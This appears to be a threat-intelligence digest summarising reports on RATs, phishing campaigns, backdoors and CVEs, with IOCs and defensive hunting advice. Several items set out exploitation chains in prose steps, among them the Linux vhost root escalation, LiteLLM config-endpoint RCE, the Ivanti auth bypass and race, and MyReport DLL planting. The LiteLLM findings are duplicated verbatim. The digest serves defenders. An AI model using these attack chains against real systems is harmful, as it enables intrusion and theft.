item.title: KGB RAT: A Fully Undetectable Windows Trojan Built to Spy, Steal, and Terrorize
item.description:
KGB RAT is a commodity NjRAT fork sold as MaaS since late 2025, combining credential theft, HVNC, ransomware, and psychological harassment features in a single configurable builder with a daily-updated FUD crypter.
- KGB RAT is built on NjRAT (0.7D Lime Edition), meaning existing NjRAT signatures already match this family. The majority of samples are x86 .NET PE executables compiled with VB.NET. The builder generates payloads in EXE, BAT, HTA, and REG formats, and a Unique Stub Generator produces a distinct stub per build to defeat static signatures. Subscription pricing starts at $150/month, dropping a capable adversary into a broad operator pool without requiring any malware development skill. Group-IB identified server infrastructure at version 0.1 dating to late January 2022, meaning the developer spent roughly three years building before going to market.
- The execution chain is forensically legible. The dropper creates svchost.exe in AppData\Local\Temp in a suspended state (dwCreationFlags 0x04080414, a process hollowing prerequisite), then that persistent copy becomes the primary malicious process. It immediately runs a single chained command: reg.exe sets HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden to 0, then PowerShell calls Shell.Application to refresh Explorer, hiding dropped files without a reboot. Persistence lands as a scheduled task named ChromeUpdate, trigger ONLOGON, /rl HIGHEST. The Run key HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\Loader provides a second persistence anchor. The UAC bypass hijacks HKCU\Software\Classes\ms-settings\shell\open\command with a DelegateExecute value to silently elevate via ComputerDefaults.exe (T1134, T1053.005, T1547.001, T1546.001, T1112).
- Reconnaissance runs entirely through WMI COM calls with no child process, making process-creation-only detections blind to it. Queries include SELECT * FROM AntiVirusProduct, Win32_OperatingSystem, Win32_BaseBoard (VM detection via manufacturer strings), and Win32_Process. The initial C2 beacon is delimiter-separated with |Ghost| and transmits hostname, username, OS version, admin status, and AV product in plaintext. A concurrent HTTP GET to ip-api[.]com/json/ geolocates the victim, and that data is forwarded to the operator via api.telegram[.]org as a Telegram Bot notification, creating a two-channel architecture: direct TCP socket for command execution, Telegram for victim alerting. The CryptoClipper module stores BTC, ETH, and TRC-20 wallet addresses in HKCU\Software\Clipper\BTC/ETH/TRC and silently swaps clipboard contents.
- Sandbox evasion is layered: a 600-second sleep on one thread outlasts most automated analysis windows, a 4-second polling loop runs 4,412 recorded iterations for C2 beaconing, and MyAntiProcess actively checks for procexp, wireshark, dnSpy, ILSpy, VBoxService, VGAuthService, and others, terminating itself on detection. Motherboard strings including VBOX, VMware, Sandbox, and Hyper trigger execution abort. The self-protection mechanism sets ProcessBreakOnTermination (flag 29 via NtSetInformationProcess), so killing the process triggers an immediate BSOD. Sentinel file %TEMP%\obito.txt tracks first execution and suppresses the fake error decoy on subsequent runs.
- The IOC picture across the analyzed cluster is concrete. Primary C2 is 104.248.130[.]195 on ports 7489, 7490, and 7492. Secondary C2 is 2.59.134[.]215 on port 443, blending with HTTPS traffic. The malware site is kgbrat[.]org. Host artifacts include %TEMP%\svchost.exe, %TEMP%\obito.txt, %TEMP%\scream.wav, %TEMP%\sand.dat, %TEMP%\select.dat, and startup .url files under the user's Startup folder. The report contains 12 unique SHA-256 hashes covering the analyzed sample set.
Hunt priority: query scheduled tasks for ChromeUpdate with ONLOGON trigger and /rl HIGHEST; alert on schtasks.exe or reg.exe spawned from processes in AppData\Local\Temp; flag outbound HTTP to ip-api[.]com and api.telegram[.]org from non-browser processes; check HKCU\Software\Classes\ms-settings\shell\open\command for the DelegateExecute hijack; and search for the |Ghost| delimiter in network captures. IOCs and configuration field definitions are in the Group-IB report.

item.title: Fake WatchGuard VPN Site Steals Credentials
item.description:
A no-malware credential phish targeting WatchGuard VPN users delivers the real, signed installer while quietly exfiltrating credentials, making endpoint defenses nearly blind to the attack.
Key findings:
- The campaign uses SEO poisoning to surface watchguard-vpn[.]net in Bing results for VPN client searches. The lookalike site mimics the legitimate WatchGuard download page and presents a pop-up asking for Server, Login, and Password, matching exactly what the real Mobile VPN with SSL client requests. The phishing logic is entirely in popup.js, roughly 150 lines of unobfuscated JavaScript. Credentials are wrapped in JSON and POSTed to the collection domain watchguard-ssl[.]online (resolving to 158.94.209[.]19, Omegatech LTD, AS202412, Amsterdam).
- The script deliberately rejects the first submission, clears the fields, and displays a red "Incorrect data" message to prompt a second entry. Both submissions are tagged with an attempt value, giving the attacker two credential sets to validate. After the second round, the script silently fetches the real WatchGuard installer directly from cdn.watchguard[.]com: a legitimately signed Inno Setup binary, WG-MVPN-SSL_12_11_5.exe, version 12.11.5, signed by WatchGuard Technologies, Inc. There is no trojanized file, no malicious DLL, and nothing for an endpoint agent to flag on disk.
- The lure domain watchguard-vpn[.]net was re-registered on August 22, 2026 (Realtime Register B.V.) and resolves to 80.249.132[.]140 (Site BV / LeaseWeb Netherlands 🇳🇱, AS60781), a different IP than the January 2026 observation at 74.208.236[.]39. The collector watchguard-ssl[.]online was registered September 14, 2026 via Dynadot. As of October 8, only seven VirusTotal vendors flagged the lure domain and two flagged the collector, consistent with a no-malware chain that AV and sandboxes have little to grip.
- Attribution context: WatchGuard's Secplicity team first reported this domain cluster in January 2026. Microsoft Threat Intelligence subsequently linked the broader campaign, which also targeted F5, Fortinet, SonicWall, and Sophos lookalike sites, to Storm-2561, a financially motivated actor active since May 2025. The October incident Huntress analyzed is consistent with that campaign but represents an evolution: the fake client has been removed entirely, replaced by the legitimate CDN download.
- In the investigated incident, Huntress Managed Defender flagged the malicious domain 21 seconds after page load. Browser history showed no cdn.watchguard[.]com download, indicating the victim likely did not complete the second submission round, though first-round credentials may have been captured.
Practitioner takeaway: The forensic pivot here is browser history and network logs, not endpoint telemetry. Look for outbound JSON POSTs to watchguard-ssl[.]online or connections to 158.94.209[.]19 in proxy and firewall logs. Check browser history for visits to watchguard-vpn[.]net and correlate timestamps against any VPN authentication events from hosting-provider ASNs (AS60781, AS202412) or previously unseen geolocations. Treat any VPN endpoint and account credential entered on the site as compromised: reset passwords immediately and review SSL VPN login logs for authentication from unfamiliar ASNs or countries. Enforce MFA on VPN accounts. Block watchguard-vpn[.]net, watchguard-ssl[.]online, 80.249.132[.]140, and 158.94.209[.]19. The full IOC table is in the Huntress report.

item.title: How a leaked builder of XWorm turned a remote access trojan into a surveillance kit
item.description:
XWorm's leaked V6.4 builder drove a fourfold detection surge, with 46 plugins now including HBrowser, which grants live browser session control, bypassing MFA entirely. IOCs are on Netskope Threat Labs' GitHub.

item.title: Hackers cranked French supermarkets’ freezers up to 50 degrees, causing hundreds of stores to lose their stock
item.description:
Attackers remotely triggered forced-defrost on Danfoss AK-SM800 and AK-SC355 refrigeration controllers, destroying stock across 400-plus French 🇫🇷 supermarkets. Isolate internet-exposed Danfoss units; end-of-life models have no patch path.

item.title: CVE-2026-74580: Linux vhost stale IOTLB cache leading to LPE and VM escape
item.description:
CVE-2026-74580 (CVSS 8.8) is a stale IOTLB metadata cache bug in Linux vhost frontends with a working local-to-root exploit and a confirmed VM escape path. Actively reproduced on Ubuntu, RHEL, Amazon Linux, Azure Linux, and Oracle Linux. Patch now.
Key details:
- The root cause sits in vq->meta_iotlb[], the cache that stores IOTLB mappings for descriptor, available, and used rings. VHOST_SET_VRING_ADDR and VHOST_SET_VRING_NUM replace the vring configuration without flushing that cache. A subsequent cache hit skips range validation and computes a translated pointer as "old_map->addr + new_addr - old_map->start", which then feeds directly into raw_copy_to_user() or raw_copy_from_user() with no bounds check. The defect traces to the interaction of two upstream commits: f88949138058 (metadata cache introduction) and 0210a8db2aec (deferred GIOVA validation).
- The local privilege escalation chain is fully demonstrated: a uid=1000 user primes meta_iotlb[], issues VHOST_SET_VRING_ADDR to swap the address while the stale cache survives, repoints the descriptor ring to leak 8 bytes via an IOTLB_MISS response, reads IDT[0] to recover the KASLR slide, then repoints the used ring to overwrite modprobe_path at runtime. Triggering request_module() executes a memfd payload as uid=0. The chain was reproduced with one generic x86-64 exploit across all five tested distributions. A public PoC is on GitHub.
- The VM escape path requires a guest configured with vIOMMU, iommu_platform, and VIRTIO_F_RING_RESET. The guest primes the used-ring metadata cache, issues a queue reset followed by a new queue address via VHOST_SET_VRING_ADDR, and re-enables the queue. The stale cache survives the reset, and the resulting used-ring write escapes guest RAM into the QEMU heap, corrupting QOM object tables and yielding controlled QEMU RIP.
- Exposure is worse than expected on default installs. Ubuntu 26.04 exposes /dev/vhost-vsock as 0660 root:kvm (kvm group membership required), but RHEL 9.8, Amazon Linux 2023, Azure Linux 3.0, and Oracle Linux 10.2 all expose it as 0666, meaning any local user on those systems can reach the exploit without any group membership. Affected device nodes include /dev/vhost-net, /dev/vhost-vsock, /dev/vhost-scsi, and /dev/vhost-vdpa-*.
- The upstream fix resets the vring metadata cache inside vhost_vring_set_num_addr(), forcing reconfigured addresses back through IOTLB validation. Fixed in kernel stable releases 5.10.265, 5.15.216, 6.1.183, 6.6.152, 6.12.104, 6.18.45, 7.1.9, and 7.2. Vendor advisories are live for Amazon Linux and Oracle Linux.
DFIR takeaway: For incident response, look for unexpected privilege escalation to root on Linux hypervisor or container hosts alongside unusual modprobe_path modification, which would appear as a write to the string at the kernel symbol modprobe_path (default /sbin/modprobe) followed by a short-lived root process and a restoration write. On unpatched virtualization hosts, treat any QEMU crash with heap corruption signals as a potential exploitation attempt against this path. Check /dev/vhost-* permissions immediately with "ls -la /dev/vhost-*": world-readable (0666) nodes on RHEL, Amazon Linux, Azure Linux, or Oracle Linux systems mean the local chain is reachable by any user. Until patched, restrict those device nodes with chmod, prevent untrusted containers from accessing them, and do not expose vhost devices with iommu_platform to untrusted guests. Note that permission changes do not revoke already-open file descriptors. The technical write-up and PoC are publicly available.

item.title: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk
item.description:
An opportunistic actor breached a European bank via a misconfigured third-party VPN gateway lacking MFA, then attempted WSUS RCE for persistence. Audit third-party edge appliances for MFA enforcement and rotate exposed credentials.

item.title: When LLM Gateways Go Wrong: Findings from LiteLLM
item.description:
Two CVEs in LiteLLM's gateway expose any authenticated user to RCE, admin takeover, and credential theft via a missing RBAC check on a single configuration endpoint, patched in v1.83.9.
Key findings:
- CVE-2026-35029 is the core flaw: the POST /config/update endpoint in litellm/proxy/proxy_server.py performs only a generic auth check (user_api_key_auth) and no subsequent role verification, while the UI session token's startswith("/config") prefix match against the ui_routes allowlist lets any logged-in user, including baseline "Internal User" accounts, reach an endpoint meant for admins only. The three immediate impacts are arbitrary file read (inject UI_LOGO_PATH into environment_variables, then call GET /get_image to retrieve any file the process can read, including secrets), admin account takeover (overwrite UI_USERNAME and UI_PASSWORD environment variables so the /login flow authenticates the attacker as PROXY_ADMIN), and RCE via pass-through endpoint configuration that triggers importlib exec_module() on a Python file downloaded from an attacker-controlled S3 or GCS bucket.
- CVE-2026-59823 is a separate SSRF: the /chat/completions endpoint accepts a user_config body parameter that constructs a new litellm.Router with attacker-supplied api_base values, routing LLM API calls, including any configured provider keys in default headers, to an arbitrary server. The configurable_clientside_auth_params restriction that guards the direct api_base and api_key fields does not apply to the user_config code path, so it bypasses the intended guardrail entirely.
- Two additional weaknesses tracked under GHSA-69x8-hrgq-fjj8 (marked duplicate): password hashes for all users are reachable by low-privileged accounts through the same UI token bypass, and those hashes are produced by a single unsalted iteration of a standard hash function, making offline cracking with rainbow tables or brute force practical once the hashes are extracted.
- The full attack chain from a low-privileged account to RCE requires no zero-day and no memory corruption: authenticate, POST to /config/update with a malicious pass_through_endpoints entry pointing to an attacker-owned S3 bucket, and LiteLLM downloads and executes the Python file at configuration load time. The proof of concept in the report uses os.makedirs() as the payload; a reverse shell is a one-line substitution.
Responder takeaway: if you run LiteLLM in your AI stack, treat any instance below v1.83.9 as fully compromised from the perspective of any authenticated user. Upgrade to v1.83.9 immediately. For forensic triage, review your proxy's persisted YAML configuration and database-stored general_settings for unexpected pass_through_endpoints entries with s3:// or gcs:// targets, and audit environment_variables stored in the config for anomalous UI_LOGO_PATH, UI_USERNAME, or UI_PASSWORD values. Check outbound network logs from the LiteLLM host for connections to S3/GCS endpoints or unexpected external IPs at LLM API call time, which would indicate SSRF exploitation of CVE-2026-59823. The report is from Check Point Research and contains the vulnerable and patched code paths.

- CVE-2026-35029 is the core flaw: the POST /config/update endpoint in litellm/proxy/proxy_server.py performs only a generic auth check (user_api_key_auth) and no subsequent role verification, while the UI session token's startswith("/config") prefix match against the ui_routes allowlist lets any logged-in user, including baseline "Internal User" accounts, reach an endpoint meant for admins only. The three immediate impacts are arbitrary file read (inject UI_LOGO_PATH into environment_variables, then call GET /get_image to retrieve any file the process can read, including secrets), admin account takeover (overwrite UI_USERNAME and UI_PASSWORD environment variables so the /login flow authenticates the attacker as PROXY_ADMIN), and RCE via pass-through endpoint configuration that triggers importlib exec_module() on a Python file downloaded from an attacker-controlled S3 or GCS bucket.

- CVE-2026-59823 is a separate SSRF: the /chat/completions endpoint accepts a user_config body parameter that constructs a new litellm.Router with attacker-supplied api_base values, routing LLM API calls, including any configured provider keys in default headers, to an arbitrary server. The configurable_clientside_auth_params restriction that guards the direct api_base and api_key fields does not apply to the user_config code path, so it bypasses the intended guardrail entirely.

- Two additional weaknesses tracked under GHSA-69x8-hrgq-fjj8 (marked duplicate): password hashes for all users are reachable by low-privileged accounts through the same UI token bypass, and those hashes are produced by a single unsalted iteration of a standard hash function, making offline cracking with rainbow tables or brute force practical once the hashes are extracted.

- The full attack chain from a low-privileged account to RCE requires no zero-day and no memory corruption: authenticate, POST to /config/update with a malicious pass_through_endpoints entry pointing to an attacker-owned S3 bucket, and LiteLLM downloads and executes the Python file at configuration load time. The proof of concept in the report uses os.makedirs() as the payload; a reverse shell is a one-line substitution.

Responder takeaway: if you run LiteLLM in your AI stack, treat any instance below v1.83.9 as fully compromised from the perspective of any authenticated user. Upgrade to v1.83.9 immediately. For forensic triage, review your proxy's persisted YAML configuration and database-stored general_settings for unexpected pass_through_endpoints entries with s3:// or gcs:// targets, and audit environment_variables stored in the config for anomalous UI_LOGO_PATH, UI_USERNAME, or UI_PASSWORD values. Check outbound network logs from the LiteLLM host for connections to S3/GCS endpoints or unexpected external IPs at LLM API call time, which would indicate SSRF exploitation of CVE-2026-59823. The report is from Check Point Research and contains the vulnerable and patched code paths.

item.title: CVE-2026-70111: One-Packet Windows Server DoS via DFS
item.description:
CVE-2026-70111: A single malformed DFS referral packet crashes Windows Server 2019, 2022, and 2025 with a kernel null-dereference in mup.sys. Patch shipped October 13, 2026; no active exploitation observed as of publication.
Key findings:
- The root cause sits in mup.sys. An earlier null-pointer guard (checking that wzExpandedName length is greater than zero before calling wcslen()) was removed from Server builds while Windows 10 retained it. A crafted DFS_REFERRAL_V3 NameList referral response, where ExpandedNameOffset points to an empty WCHAR string (\x00\x00), flows through PktExpandSpecialEntryFromReferral() unchecked, the kernel dereferences a bad pointer, and the machine BSODs. Corelight reproduced the crash 11/11 times on Server 2022 and 3/3 times on Server 2019.
- The attack chain requires only network adjacency and abuses the implicit trust Windows places in DFS referral responses. The attacker stands up a rogue SMB server, coerces the target to initiate an SMB connection toward it using existing public tooling, then replies with the malformed DFS_REFERRAL_V3 payload. mup.sys processes the response, faults, and the server reboots. The entire exchange takes seconds, and because an attacker in this position can repeat it continuously, they can keep Domain Controllers or other critical servers offline indefinitely.
- On the victim host, the crash leaves almost nothing useful. Event ID 41 (kernel power) and Event ID 6008 (unexpected shutdown) appear in the System log, but no minidump and no clear crash reason. The server does not get a chance to log anything about why it faulted. This makes network-side evidence the primary forensic source.
- Zeek's conn.log provides the post-crash signal. When mup.sys null-dereferences, the TCP stack dies instantly, leaving established sessions silent. Zeek records these as conn_state=S1. After the server recovers, other hosts attempting to resume connections receive RSTs from a machine with no session state. Depending on timing relative to Zeek's default 5-minute inactivity timeout, those appear as conn_state=RSTR (reboot within the timeout) or conn_state=RSTRH (RST arrives as a new mid-stream connection with no SYN, after the timeout). A sudden cluster of S1, RSTR, and RSTRH connections all involving the same server is a hunt-worthy pattern for unexpected reboots, including exploitation of this vulnerability.
Practitioner takeaway: network logging is the detection path here, not host logs. Hunt your Zeek conn.log for a burst of conn_state values of S1, RSTR, and RSTRH from the same server within a short window, especially if that server is a Domain Controller, then cross-reference with Event ID 41 and Event ID 6008 in the Windows System log to confirm an unexpected reboot. Because the malformed DFS response is application-layer content inside otherwise normal-looking SMB traffic, connection metadata alone will not catch it: you need full transaction logging to see the malformed DFS_REFERRAL_V3 payload. Patch priority is Windows Server 2019, 2022, and 2025 via the October 2026 cumulative update.

item.title: Administrating the Administrator, An OCI Identity Domains Permission Bypass
item.description:
Oracle Cloud Infrastructure identity domain permission bypass let a User Manager role create API keys for the Identity Domain Administrator, patched in Oracle's June 2026 critical security update after responsible disclosure.
Key findings:
- The flaw lived in the gap between two separate OCI authorization models: classic OCI IAM policies and Identity Domain AppRoles. A lower-privileged User Manager role was correctly blocked from resetting passwords or changing email addresses for the Identity Domain Administrator, but the same authorization check was absent from the API key creation path. A single POST to /admin/v1/ApiKeys via the Identity Domains SCIM API, authenticated only with AppRole permissions and zero classic IAM policy grants, successfully added a signing key to the Identity Domain Administrator account, yielding full domain-level control. The researcher's hypothesis: two separate engineering teams owned the two API surfaces and the shared resource (API keys) fell through the gap between them.
- The attack path is one step. The lower-privileged user navigates to the target admin's API Keys tab inside the identity domain console and adds a public key. The resulting credential is immediately active, as confirmed by a successful oci os ns get call using the newly minted key. The same User Manager role could also create SMTP credentials and auth tokens for the Identity Domain Administrator, widening the persistence surface.
- For incident responders reviewing OCI tenancies: the evidence trail lives in the Identity Domains audit log, not classic OCI IAM audit events. Look for ApiKey creation events (resourceType: ApiKey in the SCIM audit log at /admin/v1/AuditEvents) where the actor's assigned AppRoles do not include Identity Domain Administrator but the target user does. Cross-reference the actor's group memberships against IAM policies to confirm no classic policy grant existed. The credential's ocid and fingerprint appear in the SCIM response and provide a precise creation timestamp.
- Oracle patched the issue and it appears in the June 2026 critical security update. The fix closes the AppRole-based escalation path specifically. It does not and should not block a principal with a legitimate classic IAM policy (such as "Allow group MyGroup to manage users in MyCompartment") from creating API keys via the SCIM API. The distinction matters for review: post-patch, API key creation for an Identity Domain Administrator user should only succeed when a classic IAM policy grant is present, not AppRole membership alone.
Takeaway: audit every identity domain in your OCI tenancy for users assigned User Manager or User Administrator AppRoles, then check whether any long-lived API keys, SMTP credentials, or auth tokens exist on Identity Domain Administrator accounts that were created by those lower-privileged actors. The OCInferno tool (github[.]com/NetSPI/OCInferno) can graph AppRole-to-IAM-policy pivot paths that manual policy review misses. The IOC here is not a hash, it is an unexpected API key fingerprint on a privileged account with a creation actor who holds only AppRole permissions.

item.title: ClingSTUN Turns Vulnerable Edge Devices Into Attacker Infrastructure
item.description:
ClingSTUN converts unpatched IoT and edge devices into attacker-controlled proxy nodes, abusing legitimate public STUN infrastructure to blend NAT traversal traffic with normal VoIP and WebRTC communications.
Key details:
- ClingSTUN is a Linux back-connect proxy backdoor attributed by FortiGuard Labs across three documented campaign phases, each expanding its exploitation scope. The earliest phase exploited CVE-2022-36553 (command injection in Hytec Inter HWL-2511-SS routers) using 124.163.212[.]119 as its download source. Later phases added CVE-2025-34035 (EnGenius EnShare IoT Gigabit Cloud Service) and CVE-2024-23625 (D-Link UPnP), with the third phase reaching vendors including Ivanti, Tenda, Sunhillo, MeiG, Lantronix, Realtek, TP-Link, and AVTECH. The progression from a single CVE to a multi-vendor exploitation portfolio signals deliberate infrastructure scaling, not opportunistic scanning.
- The malware runs across ARM, Intel 80386, MIPS R3000, PowerPC, and AMD x86-64 architectures, making it viable across a wide range of consumer and SMB networking hardware. Persistence is written to /root/.cling and /usr/local/bin/.cling, with execution hooks inserted into /etc/inittab, /etc/init.d/rcS, and /etc/rc.d/rc.boot. Process concealment is aggressive: ClingSTUN clears its own command-line arguments to appear blank in ps output, then bind-mounts process metadata copied from /proc/1/ over its own /proc/PID/ directory, effectively impersonating init to inspection tools.
- The STUN abuse is the forensic curveball. ClingSTUN opens a random UDP port, sends standard 20-byte STUN binding requests to a list of public STUN endpoints (13 in the latest version, all required to succeed), learns its external NAT-mapped IP and port, then periodically transmits its group identifier and port mapping back to those endpoints. Because the STUN servers are legitimate third-party infrastructure rather than attacker-controlled C2, IP reputation blocklists will not flag these exchanges. FortiGuard notes the operator's mechanism for retrieving the mapping and delivering control traffic through NAT remains unverified, which limits infrastructure-based detection further.
- Seven hard-coded exploits inside ClingSTUN enable self-propagation to additional devices, targeting technologies linked to Realtek, MVPower, TBK, Linksys, LB-LINK, China 🇨🇳 Mobile, and KGUARD, with vulnerabilities spanning 2014 through 2026. The watchdog manipulation (opening /dev/watchdog and /dev/misc/watchdog via ioctl to kill the timer) prevents automatic device recovery, and the malware kills competing processes whose executables reside in /tmp or /var/tmp, evicting rival malware families including Mirai variants. The report lists 19 SHA-256 sample hashes.
Practitioner takeaway: On a potentially compromised Linux IoT or embedded device, check for files at /root/.cling and /usr/local/bin/.cling, and inspect /etc/inittab, /etc/init.d/rcS, and /etc/rc.d/rc.boot for unauthorized entries. A process showing an empty command line in ps combined with a bind-mount anomaly under /proc is a strong behavioral indicator. For network hunting, look for outbound UDP to public STUN services (port 3478) originating from devices that have no legitimate VoIP or WebRTC function. Because STUN endpoints are not malicious by nature, the signal is context and device type, not destination reputation. The 19 sample hashes and full IOC detail are in the PolySwarm report.

item.title: A Translator Extension, a Lapsed Domain, and 87,000 Installs
item.description:
A translator extension with 87,000 installs silently exfiltrated every URL visited and injected server-delivered JavaScript for 99 days. Every traditional endpoint control returned clean. The browser was the only crime scene.
Key findings:
- The extension (Edge ID: ifbamokmfkcnhbpeokkochdpecopfccd, version 0.4.2) was a legitimate translator whose backing domain, clicktranslator[.]com, expired and was re-registered on 19 February 2026 by a new owner. background.js (SHA-256: d4a2d0404a9197d2491b7412d2872e647a06e7c6ed482ba064be8c64df9f10fc) POSTed the full URL of every page visited, the referring URL, and a persistent UUID to api.clicktranslator[.]com/api/1.00/page/translation on every navigation that was not Google Translate. content2.js ran with "world": "MAIN", executing in the page's own JavaScript context, and loaded clicktranslator[.]com/js/translate.js at runtime from the server, meaning what actually ran was never shipped in the package and only survives in the HTTP cache.
- The server-delivered payload performed affiliate commission hijacking. It fetched a domain list from 1752680588.rsc.cdn77[.]org, geolocated the user via meetlookup[.]com, and on matching merchant navigations silently redirected through advertisingshubb[.]com/pg/?to= with a full-page CSS rule (display: none !important) keeping the redirect invisible. One chain shows a user clicking a paid search ad, landing on the advertiser site tagged as Bing paid search, then being re-routed 14 seconds later to the same site tagged as affiliate traffic under code B73K. A second revenue stream ran through an ad server using Revive/OpenX syntax on provenpixel[.]com and 848trk[.]com with rotating subdomains (lg-zhr, lg-twn, fv-34-955, gx-71-955) that defeat hostname blocklisting. The same infrastructure, CDN account, affiliate gateway, and 19 February 2026 registration date ties this to a second extension, Amazing Refresh, with close to 100,000 installs.
- Disk forensics found nothing. Antivirus history was clean across more than a year. Over 200 execution artifacts resolved to legitimate binaries. Run keys, Winlogon, Startup folder, and scheduled tasks were all clean. Sysmon retained two days and the Security log eleven days against a 99-day dwell. The EDR raised two detections, both from the forensic collection itself. What surfaced the case was a human reviewing a per-domain DNS frequency list and noticing clicktranslator[.]com appearing 561 times in a two-week window.
- Two forensic traps matter here. Extension files on disk carry a $STANDARD_INFORMATION modified time that predates the install by months because archive extraction preserves package build timestamps: the $FILE_NAME attribute, set by the filesystem at actual creation, matched the browser's install record and is the reliable timestamp. In the Chromium visits table, the transition type column distinguishes client-side redirects from server-side ones: a sequence of CLIENT_REDIRECT hops beginning seconds after an ordinary page load is the signature of injected script, and it is what turned a suspicious domain into a demonstrated mechanism.
Practitioner takeaway: Add five artifacts to your triage collection profile: the extension directory, extension settings (Secure Preferences), the script cache, the HTTP cache, and browser upgrade snapshots under User Data\Snapshots\(version)\, which on this host held History and Web Data reaching back before the live database did. Collect the entire cache directory before uninstalling anything. For hunting, query DNS telemetry for browser process resolutions of clicktranslator[.]com, advertisingshubb[.]com, meetlookup[.]com, and provenpixel[.]com, and run a per-domain frequency review. Campaign identifiers stable across the full 92-day window: Analytics ID G-C2X1K7ZKNP and yk_tag value 444. Full IOC tables and SHA-256 hashes for all five extension files are in the report.

item.title: MyReport Updater: From gRPC to SYSTEM
item.description:
A LocalSystem-privileged updater service in MyReport's BI platform exposes an unauthenticated gRPC endpoint on TCP 9095, enabling LPE to SYSTEM and unauthenticated RCE from the network. Quarkslab discovered both flaws during an assumed breach assessment on a Citrix server.
Key findings:
- MyReportUpdaterService runs as NT AUTHORITY\SYSTEM and listens on TCP port 9095 on all interfaces, accepting gRPC requests including UpdateConfigReferent with no authentication. An attacker on the same network can remotely redirect the service to an attacker-controlled reference server, change the operating mode, and specify the reference port, all without credentials. The proof-of-concept Python script grpcmanual[.]py automates this call. Version 2.1.1 is confirmed vulnerable; fixes are scheduled in the October 13, 2026 release per the vendor's roadmap.
- The LPE chain works entirely from a standard user session on the target host. UpdaterManager.exe and UpdaterManagerDesktop.exe, located at C:\Program Files (x86)\MyReport\MyReport Updater\manager\, communicate with the privileged service over gRPC. The CLI exposes a mode-switching feature not available in the GUI, allowing a standard user to set the client to Referent mode and point it at an attacker-controlled server. The service then downloads a tampered ZIP module archive and writes its contents to an attacker-specified installation directory as SYSTEM.
- Integrity checks are bypassable. The reference server returns the MD5 digest and file size of each module archive, which the updater trusts. The attacker's infrastructure intercepts responses from updater.myreport[.]fr (contacted over TLS on TCP 443 with the domain visible in the SNI field), spoofs the MD5 and size for a modified archive, and serves the tampered payload. The certificate validation issue (RemoteCertificateNameMismatch) is bypassed by reproducing the vendor certificate's subject fields for the *.myreport[.]fr wildcard.
- DLL planting to SYSTEM is the privilege escalation endgame. The attacker writes HID.dll into C:\Program Files\Common Files\microsoft shared\ink, a directory loaded by osk.exe, the Windows On-Screen Keyboard. osk.exe is launched by WinLogon as NT AUTHORITY\SYSTEM from the Ctrl+Alt+Delete secure desktop. The PoC DLL verifies the loaded process holds the WinLocalSystemSid token and then spawns cmd.exe as SYSTEM.
- The RCE path removes the need for local access entirely. Network reachability to TCP 9095 plus egress from the target to attacker infrastructure is sufficient. In the tested environment an internal relay using netsh portproxy forwarded port 9095 traffic outbound; the custom gRPC call later made even that relay unnecessary by changing the reference port directly. The full chain delivers unauthenticated SYSTEM-level code execution on any host running the vulnerable updater, including Citrix servers where this was confirmed.
Practitioner takeaway: If MyReport Updater is in your environment, treat TCP port 9095 as an attack surface right now. Hunt for unexpected outbound gRPC or TLS connections from UpdaterService.exe (which uses updater.myreport[.]fr in the TLS SNI) to hosts outside the expected vendor infrastructure, and look for UpdaterManager.exe or UpdaterManagerDesktop.exe making unusual calls. Check for HID.dll in C:\Program Files\Common Files\microsoft shared\ink as a direct IOC of this exploit chain. Firewall TCP 9095 to block unauthenticated network access while patching. The full technical report and PoC scripts (grpcmanual[.]py, get_hash_and_size.ps1) are detailed in the Quarkslab post.

item.title: RSVP to Disaster: How One Click Installs a RAT
item.description:
A holiday-themed phishing campaign abuses ConnectWise ScreenConnect as a RAT, walking victims through a fake CAPTCHA and eInvite page before silently handing full remote access to attackers.
Key findings:
- The lure is a vague "You are cordially invited" email with no named host, venue, date, or time. That deliberate vagueness is the design, not an oversight. A generic message scales to thousands of inboxes while still feeling personal, and the absence of specifics manufactures curiosity that overrides caution. The single call to action, "Click Here to Download the Invite," uses a forced download to obscure where the file actually comes from.
- After clicking, victims hit a CAPTCHA page hosted on a generic, unbranded domain less than a month old, then a second fake invitation page with an "eInvite" button. Both pages carry no real event detail. The two-step flow exists to build false legitimacy and reduce hesitation before the payload drops.
- The downloaded archive is named ViewDePartyyinvites and contains ScreenConnect.ClientSetup.exe, a legitimate ConnectWise ScreenConnect installer repurposed as a RAT. MD5: 739a54032b89432bb4c9c33969f6b383. SHA256: f3aab811ae8163e09db40db201facc7e189d1a1b161be265202ca54b39b5e6cc. File size: 12,809,272 bytes. Because it is signed, trusted remote-support software, it blends past antivirus and SEG inspection.
- Once executed, the only visible trace on the victim machine is a small taskbar icon. Clicking it reveals a chat box and active connection status, confirming the attacker already has a live remote channel into the host. The compromise is fully operational before most users notice anything.
- Infrastructure: infection and payload URLs both resolve to theinvitationestateco[.]vu/EdesktopInvite/ and theinvitationestateco[.]vu/EdesktopInvite/RsvpNow/invitedetails[.]php, with IPs 104.21.73[.]121 and 172.67.162[.]73.
DFIR takeaway: Hunt for ScreenConnect running from user-writable paths like Downloads or Temp, especially where the parent process is a browser or archive handler rather than a managed software deployment. Check for the ScreenConnect taskbar icon process and any outbound connections it establishes. The domain theinvitationestateco[.]vu is a hard IOC. The report notes this campaign bypassed SEG-protected environments, so mail gateway logs alone are not sufficient for scoping; endpoint telemetry showing the zip extraction and ScreenConnect.ClientSetup.exe execution is your confirmation of compromise.

item.title: A Series of Unauthenticated Events: Chained Exploitation of Ivanti Connect Secure Zero-Days
item.description:
UTA0576 chains three zero-days in Ivanti Connect Secure for unauthenticated root RCE, actively exploited in the wild since October 3, 2026, targeting AD credentials, LAPS passwords, and BitLocker keys before patches existed.
- CVE-2026-104935 covers the authentication bypass and RCE components of this chain, patched today (October 13, 2026). The auth bypass abuses welcome.cgi routing: an attacker sends a request to /dana-na/auth/url_default/welcome.cgi with a spoofed X-DSCGI-PATH header pointing to the protected wu.cgi handler, bypassing authentication entirely. The RCE exploits a race condition in wu.cgi where a Perl script submitted with a .zip extension is written to /home/runtime/tmp/<MD5(filename)> before the ZIP validity check fails and the file is deleted. Parallel requests using the same X-DSCGI-PATH trick execute the script during that window. The privilege escalation (patch pending in a future release) abuses the dsinvoked root service by patching the in-memory copy of libdsplibs[.]so to manipulate DSCache and redirect a maintenance task to the Perl interpreter, achieving root. Critically, the on-disk library is never touched, meaning Ivanti's Integrity Checker Tool returns clean.
